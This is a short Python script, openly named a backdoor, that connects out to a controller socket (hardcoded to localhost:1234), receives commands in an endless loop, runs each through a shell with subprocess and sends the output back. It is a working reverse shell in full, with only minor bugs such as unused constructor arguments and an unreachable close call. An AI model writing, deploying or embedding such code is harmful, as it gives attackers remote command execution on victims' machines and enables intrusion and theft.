#!/usr/bin/python

import socket
import subprocess

class Backdoor:

	def __init__(self,ip,port):
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect(("localhost",1234))

	def execute_system_commmand(self,command):
		return subprocess.check_output(command,shell=True)

	def run(self):
		while True:
			command = self.connection.recv(1024)
			command_result = self.execute_system_commmand(command)
			self.connection.send(command_result)

		connection.close()

my_backdoor = Backdoor("localhost",1234)
my_backdoor.run()
